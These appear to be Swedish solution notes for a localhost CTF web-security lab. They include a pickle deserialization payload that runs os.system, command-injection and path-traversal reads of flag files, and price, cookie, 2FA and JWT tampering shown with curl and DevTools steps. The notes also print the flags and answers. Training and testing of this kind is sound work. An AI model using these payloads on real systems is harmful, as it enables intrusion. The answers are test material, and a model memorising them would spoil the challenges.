 Sammanfattning av stegen på path traversal
Testa nu så här:

1️⃣ ls → Ser att flags/ finns
2️⃣ ls flags → Ser att sacred_command.txt finns
3️⃣ cat flags/sacred_command.txt

--------------------------------------------------
Sammanfattning av stgen på OS command injection

Lista root-katalogen för att hitta /flags/ → ls /
Lista /flags/ för att se om flaggfiler finns → ls /flags
Läs flaggfilen med cat → cat /flags/sacred_command.txt

 Nu är labben komplett och lätt att förstå!

------------------------------------------------------
Sammanfattning av steg på  Insecure Deserialization

Besök sidan på http://localhost:5000/canopic_jar.
Skapa en payload i Python med pickle och base64.
Skicka payloaden via inputfältet på webbsidan.
Servern deserialiserar datan och kör kommandot.
Flaggan visas! 
--------------------------------------------------------
payloaden : 
import pickle
import base64
import os

# Skapa en exploitklass
class Exploit:
    def __reduce__(self):
        return (os.system, ("cat /flags/soul_of_osiris.txt",))

# Serialisera objektet
exploit = pickle.dumps(Exploit())

# Konvertera till Base64 för att skicka via webben
payload = base64.b64encode(exploit).decode()
print(payload)

Eller curl -X GET http://172.18.0.2:5000/canopic_jar
----------------------------------------------------------
Sammanfattning client side exploit

Webbplatsen litar på klientens inmatning (ingen servervalidering).
Vi ändrar priset till ett negativt värde → Flaggan ges som belöning!
Exploit fungerar via både DevTools och en POST-request.

Metod 1: Manipulera HTML i webbinspektören

    Öppna DevTools (Högerklicka → "Inspektera element" eller F12).
    Leta upp HTML-koden för prisinputfältet:

<input type="text" id="price" name="price" value="100">

Ändra värdet till ett negativt tal:

<input type="text" id="price" name="price" value="-1000">

Tryck på "Buy" och skicka formuläret.
Om exploiten fungerar får du flaggan:

     You exploited the system! Flag: O24{market_of_hatshepsut_welcomes_the_shadow_trader}

Alternativ: Skicka en manipulerad request

Om du vill använda Burp Suite eller cURL, gör så här:
 Metod 2: cURL

Skicka en POST-request med negativt pris:

curl -X POST -d "price=-1000" http://localhost:5000/store/buy

Får du flaggan i svaret? Då har du klarat labben!

 Labben är redo att användas i en CTF! Testa själv och se om det funkar!

 ----------------------------------------------------------------------

 Sammanfattning av Broken Access Control

Mål: Bli admin genom att manipulera cookies.
Metod 1: Manipulera cookies i DevTools

Öppna DevTools (F12) → Fliken "Application".
Navigera till "Cookies" → localhost.
Ändra cookien role från user till admin.
Ladda om sidan /admin och få flaggan:

 You have accessed the sacred chamber! Flag: O24{duat_barriers_fall_as_the_false_pharaoh_rises}

Metod 2: Skicka en request via cURL

curl -X GET http://localhost:5000/admin --cookie "role=admin"

--------------------------------------------------------------

Sammanfattning av Infinite Money Exploit

Mål: Få obegränsat med pengar genom att ange ett negativt belopp.
Metod 1: Manipulera fältet i DevTools

    Inspektera input-fältet och ändra värdet till -1000.
    Skicka formuläret och få flaggan!

    You exploited the banking system! Flag: O24{golden_sands_of_atum_create_wealth_without_end}

Metod 2: Skicka en request via cURL

curl -X POST -d "amount=-1000" http://localhost:5000/bank/transfer


Sammanfattning av stegen:

    Navigera till /temple_of_anubis och identifiera input-fältet.
    Testa whoami för att verifiera att kommandon körs.
    Kör ls -l flags/ för att se flaggfiler.
    Läs flaggan med cat flags/os_command_injection.txt.

🎯 Nu har du klarat utmaningen och fått din flagga! 🚀


            path traversal

✅ Riktiga flaggan   ../../../../root/flags/true_flag.txt
❌ Falsk flagga ancient_scroll.txt   ../flags/ancient_scroll.txt
❌ Falsk flagga cursed_tablet.txt    ../flags/cursed_tablet.txt

------------------------------------------------------------------------------


Denna metod visar exakt hur man löser utmaningen med Burp Suite.
🔥 Steg 1: Registrera en användare

1️⃣ Gå till /register och skapa ett konto.
2️⃣ Efter registrering skickas du vidare till /login.
🔥 Steg 2: Logga in och få din 2FA-kod

1️⃣ Gå till /login, logga in med dina uppgifter.
2️⃣ Du skickas vidare till /verify_2fa där du får en 2FA-kod.
3️⃣ Notera koden – men du behöver inte använda den.
🔥 Steg 3: Exploatera 2FA-buggen med Burp Suite

1️⃣ Öppna Burp Suite och aktivera Intercept Mode.
2️⃣ Gå till /verify_2fa, fyll i formuläret och skicka det.
3️⃣ När Burp fångar requesten, ändra request body till:

2fa=000000&verified=true

📌 Du kan skriva vad som helst i 2fa eller lämna den tom – det viktiga är verified=true.
4️⃣ Frigör requesten och se vad som händer!
5️⃣ Du blir inloggad och skickas till /game.
🔥 Steg 4: Lås upp Pharaoh’s Vault och ta flaggan

1️⃣ Gå till /game och fyll i rätt lösenord:

𓂀𓏏𓆣𓊪

2️⃣ I fältet för 2FA kan du skriva vad som helst eller lämna det tomt.
3️⃣ Klicka på "Unlock the Vault" och få flaggan!
🏆 Flagga

🚀 När du exploaterat buggen och angett lösenordet korrekt får du:

O24{PHARAOHS_2FA_BROKEN}

🔥 Varför fungerar detta?

    Applikationen litar på verified=true, vilket gör att vi kan hoppa över 2FA-verifieringen.
    Vi kan skicka en tom 2FA-kod och ändå bli godkända.
    Flask använder sessionshantering, vilket betyder att vi kan manipulera vår autentisering i Burp.

--------------------------------------------------------------------------------------


document.cookie = "auth_token="TOKEN"; path=/";





Om du vill göra allt direkt från jwt.io istället för att använda Python-skriptet, följer du dessa steg:
🛠 Steg för att manipulera JWT på jwt.io

    Öppna jwt.io

    Klistra in din nuvarande JWT
        Till exempel:

    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ1c2VyIiwgInJvbGUiOiAidXNlciIsICJleHAiOiAxNzQxOTYxOTYzfQ.p2egRol2RTzmjCgiAffOba1htqma-RfEJC0ZtZsQcE0

Gå till "Payload" (mellersta sektionen)

    Ändra "role": "user" till

    "role": "admin"

Signaturen är sårbar, så vi byter ut den!

    Skrolla ner till "Verify Signature".
    Radera allt i "your-256-bit-secret" och skriv istället:

        MAYCAQACAQA=

        (Detta är den magiska strängen som gör att servern accepterar JWT:n.)

    Kopiera den nya JWT-tokenen
        Den ska nu ha rätt "role": "admin", och signaturen ska vara MAYCAQACAQA=.

🚀 Hur använder du den nya JWT i webbläsaren?

    Öppna Developer Tools (F12) i Chrome/Firefox

    Gå till Console och skriv in:

document.cookie = "auth_token=DIN_NYA_JWT_HÄR; path=/";

    Byt ut DIN_NYA_JWT_HÄR mot den du fick från jwt.io.
    Exempel:

        document.cookie = "auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ1c2VyIiwgInJvbGUiOiAiYWRtaW4iLCAiZXhwIjogMTc0MTk2MTk2M30.MAYCAQACAQA=; path=/";

    Tryck Enter och gå sedan till /admin i webbläsaren
        Om allt gick rätt, ska du se flaggan! 🏆🎉

❗ Vanliga problem och lösningar

    "403 Forbidden" när jag går till /admin
        Kolla i Developer Tools → Application → Cookies om auth_token finns.
        Om JWT-tokenen är fel, prova att generera en ny på jwt.io.

    "Invalid token - Signature verification failed"
        Dubbelkolla att signaturen är MAYCAQACAQA=, inget annat.
        Se till att "role": "admin" finns i payloaden.

🚀 Nu kan du göra allt direkt från jwt.io!

    Behöver inte köra några Python-skript.
    Direkt manipulation av JWT i webbläsaren.
    Snabb och enkel flagg-exploatering! 🔥

Testa detta nu och se om du får flaggan! 🚀🏆

-----------------------------------------------------------------------------------------------------------------------